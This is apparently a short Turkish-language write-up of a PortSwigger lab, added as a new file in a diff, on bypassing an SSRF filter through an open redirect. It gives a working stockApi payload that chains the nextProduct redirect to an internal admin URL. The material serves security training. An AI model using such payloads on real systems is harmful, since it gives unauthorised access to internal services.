@@ -1,0 +1,21 @@
+Lab: SSRF with filter bypass via open redirection vulnerability
+
+url: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
+
+
+
+Analiz:
+-- Bu kez direkt adres araması ile yapamıyoruz.
+-- Sirede sayfaları gezerken sonraki post isteği sayesinde site içerisindeki sorgu durumlarını tahmin edebiliyoruz
+-- Stok sorgusu içine bu isteği gömerek sorguyu ilerletince admin panel avucumuza düşmü oluyor.
+
+
+Zafiyet:
+
+-- /product/nextProduct?currentProductId=1&path=/product?productId=2 komutu ile postlar arası gezinti vardı
+-- stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1 değeri ise stok kontrolü yapıyordu.
+
+-- stockApi= /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin 
+bu payloadı kullanarak site içeriğinde gizli alanlara erişim kazandık.
+
+
